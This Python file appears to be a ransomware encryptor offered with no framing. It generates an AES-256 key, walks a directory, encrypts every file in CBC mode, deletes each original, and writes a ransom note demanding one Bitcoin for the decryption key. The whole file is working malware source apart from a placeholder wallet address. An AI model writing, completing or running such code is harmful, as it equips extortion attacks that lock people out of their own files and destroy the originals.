from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import os

def generate_key():
    key = get_random_bytes(32)  # AES-256 requires 32 bytes
    with open("key.bin", "wb") as f:
        f.write(key)
    return key

def load_key():
    with open("key.bin", "rb") as f:
        return f.read()

def pad(data):
    padding_length = AES.block_size - len(data) % AES.block_size
    return data + bytes([padding_length]) * padding_length

def encrypt_file(file_path, key):
    with open(file_path, "rb") as f:
        plaintext = f.read()
    cipher = AES.new(key, AES.MODE_CBC)
    ciphertext = cipher.encrypt(pad(plaintext))
    with open(file_path + ".enc", "wb") as f:
        f.write(cipher.iv + ciphertext)
    os.remove(file_path)

def encrypt_directory(directory, key):
    for root, _, files in os.walk(directory):
        for file in files:
            full_path = os.path.join(root, file)
            if not file.endswith(".enc") and not file == "key.bin":
                encrypt_file(full_path, key)

    # Write ransom note
    with open(os.path.join(directory, "READ_ME.txt"), "w") as f:
        f.write("Your files have been encrypted.\nSend 1 Bitcoin to 0x123456 to get the decryption key.\n")
